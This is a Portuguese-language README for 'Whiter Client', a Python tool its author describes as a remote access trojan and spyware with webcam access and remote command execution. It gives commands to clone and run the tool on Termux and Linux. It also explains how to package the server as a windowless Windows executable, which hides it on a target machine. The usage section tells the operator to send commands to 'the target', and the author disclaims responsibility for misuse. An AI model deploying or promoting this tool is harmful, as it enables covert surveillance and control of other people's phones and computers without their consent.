

# Whiter Client V2.1

By Dragonmodder (Jhon)

Whiter Client é uma ferramenta de administração remota (RAT) e também um spyware, desenvolvida em Python puro. 

Recursos principais:

Acesso a webcam, 
Acesso remoto a certas coisas

Observações:

Caso usar para o mau, eu não me responsabilizo por qualquer dado em telemóveis ou computadores de outras pessoas. 

Instalação

No Android (Termux):

pkg update && pkg install git python -y
git clone https://github.com/Dragonmodder7/Whiter-Client.git
cd Whiter-Client
python3 client.py

No Linux:

sudo apt update && sudo apt install git python -y
git clone https://github.com/Dragonmodder7/Whiter-Client.git
cd Whiter-Client
python3 client.py

Servidor:


python3 server.py

Cliente (controle remoto com menu):


python3 cliente.py


Como transformar o server.py em .EXE no Windows

1. Instale o pyinstaller:



pip install pyinstaller

2. Gere o executável:



pyinstaller --onefile --noconsole server.py

3. Seu .exe estará em:



dist/server.exe


Como usar

Rode o cliente.py no seu terminal

O menu aparece com opções simples

Envie comandos para o alvo

Saída do comando aparece em tempo real 
